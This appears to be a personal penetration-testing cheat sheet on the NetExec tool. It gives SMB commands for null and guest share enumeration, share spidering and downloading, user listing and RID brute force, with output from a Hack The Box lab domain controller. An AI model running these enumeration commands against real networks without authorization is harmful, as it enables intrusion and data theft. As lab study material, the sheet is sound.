
# NetExec (`nxc`)
A network service exploitation tool which automates assessing security of large networks.

## Shit that worked
### Null Access
```bash
nxc smb $ip -u '' -p '' --shares
```
### Guest Access
```bash
nxc smb $ip -u 'Guest' -p '' --shares
```
Make sure to check this, even when there is no null access and you get a `STATUS_ACCESS_DENIED` (from checking for null access), there may be Guest access when checking with the `Guest` username and no password:
```bash
└─# nxc smb 10.10.11.35 -u '' -p '' --shares
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\: 
SMB         10.10.11.35     445    CICADA-DC        [-] Error enumerating shares: STATUS_ACCESS_DENIED
                                                                                                                                                                                                                
┌─[26-01-05 12:08:22]:(root@192.168.142.128)-[~/htb/cicada]
└─# nxc smb 10.10.11.35 -u 'Guest' -p '' --shares
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\Guest: 
SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
SMB         10.10.11.35     445    CICADA-DC        DEV                             
SMB         10.10.11.35     445    CICADA-DC        HR              READ            
SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.10.11.35     445    CICADA-DC        NETLOGON                        Logon server share 
SMB         10.10.11.35     445    CICADA-DC        SYSVOL                          Logon server share 
```
### Spidering [SMB](../../../../networking/protocols/SMB.md) shares
Spider shares and download content.
```bash
nxc smb $ip -u '' -p '' -M spider_plus -o DOWNLOAD_FLAG=True
```
### User enum
```bash
nxc smb $ip -u '' -p '' --users
```
#### Userenum via RID Bruteforce
You can enumerate users with the `--rid-brute` flag which brute forces the [RID](../../../../OSCP/windows-privesc/security-mechanisms/SID.md#Format)
```bash
└─# nxc smb $ip -u 'Guest' -p '' --rid-brute
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 

... 

SMB         10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```
> [!Resources]
> - [NetExec Wiki](https://www.netexec.wiki/)
> - [GitHub](https://github.com/Pennyw0rth/NetExec)